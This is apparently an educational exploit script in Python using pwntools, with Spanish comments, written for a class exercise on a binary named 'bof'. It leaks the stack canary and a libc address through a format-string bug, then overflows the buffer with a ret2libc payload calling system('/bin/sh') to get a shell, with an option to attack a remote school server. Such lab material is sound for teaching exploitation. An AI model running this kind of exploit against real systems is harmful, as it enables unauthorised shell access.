#!/usr/bin/python3
########################################################################
# Ejecuta checksec ./bof
# Observa que todas las protecciones están acticadas.
########################################################################
# En este ejercicio tenemos dos vulnerabilidades.
# Un buffer overflow y un String Format Bug SFB
# El Strinf Format Bug consiste en un printf en el que la cadena de formato
# es controlada por el usuario.
# De esta forma se puede hacer un leak de memoria o incluso una escritura
# aleatoria en memoria.
#
# En este ejemplo el buffer es pequeño y no se puede inyectar una shellcode.
# Además la pila no es ejecutable.
# En principio no tenemos un leak de memoria luego no podemos hacer un ret2libc
# Podemos controlar la dirección de retorno pero ¿Que valor ponemos?
#
# Además si haces un checksec verás que se han activado todas las protecciones
# ASLR activado: Aleatoriza la memoria excepto el binario.
# NX Enabled: La pila no es ejecutable. No podemos inyectar una shellcode.
# Canary: Es un valor que se inserta antes de EBP y RET en la pila. 
#         Antes de ejecutar leave y ret se comprueba su valor. Si ha cambiado
#         se aborta la ejecución del programa.
# PIE:    Aleatoriza las direcciones de memoria del binario.
# RELRO:  Full Hace que la GOT sea de solo lectura. Antes de la ejecución
#         se resuelven todas las funciones de libc.          
#
########################################################################
from pwn import *
elf = context.binary = ELF("bof")
libc = elf.libc
HOST = "www.iesvirgendelcarmen.com"
PORT = 10011

gs = '''
b start_level
continue
'''
def start():
    """
    Si ejecutamos:$ xpl.py sin parámetros io.sendXXX para enviar datos por entrada estandar al proceso. io.recXXX para leer datos salida estandar del proceso.
    Si ejecutamos:$ xpl.py GDB se abre una nueva ventana con el depurador
    Si ejecutamos:$ xpl.py REMOTE se abre un socket con servidor remoto. La entrada y salida funciona igual que en local.
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
	    return remote(HOST, PORT)
    else:
        return process(elf.path)


io = start()

#Hacemos un leak de la pila para robar el canario.
#Miramos con gdb donde está el canario ebp-0xc
io.recvuntil(": ")
io.sendline("%7$p")
io.recvline()
leak = io.recvline()
canary = int(leak,16)
log.info("Canary: " + hex(canary))

#Hacemos un segundo leak de la pila para robar alguna dirección de libc.
#En gdb se buscan direcciones dentro de libc. Después se calcula el offset.
#p leak - libc.base
#Necesitamos robar la direccion de libc ya que ASRL está activado. 
#Si se desactiva no es necesario el leak.
####
# Se puede hacer el leak de una sola vez ¿Como?
####
io.recvuntil(": ")
io.sendline("%12$p")
io.recvline()
leak = io.recvline()
libc.address = int(leak, 16) - 2011136
log.info("libc.address: " + hex(libc.address))

#Por ultimo desbordamos buffer y hacemos ret2libc. La pila no es ejecutable.
#Otra opción es usar got si RELRO = Partial RELRO
io.recvuntil(": ")
payload = flat (
    b"X"*10,
    p32(canary), #ebp-0xc
    b"YYYY",     #ebp-0x8  No usado
    b"YYYY",     #ebp-0x4  No usado
    b"AAAA",     #ebp
    libc.sym['system'],    #Dirección de retorno es la de la función system de libc
    #Necesitamos un string a /bin/sh que es el comando que deseamos ejecutar y un puntero a dicho string.
    #Se puede insertar en el payload si conocemos la dirección de la pila ASR desactivado o existe un leak.
    #En realidad la cadena /bin/sh ya se encuentra en libc. La podemos buscar con pwn tools.
    b"CCCC", #Sabes el motivo de dejar este "hueco" de 4 bytes???? Piensa en como se pasan parámetros en la pila.
    next(libc.search(b'/bin/sh')), #Simulamos paso de parámetro a system. Un puntero al string que se dejea ejecutar. Consultar man system
    endianness = 'little', word_size = 32, sign = False
    )
io.sendline(payload)
io.recv()

#Hacemos la sesión interactiva (entrada y salida estandar)
io.interactive()

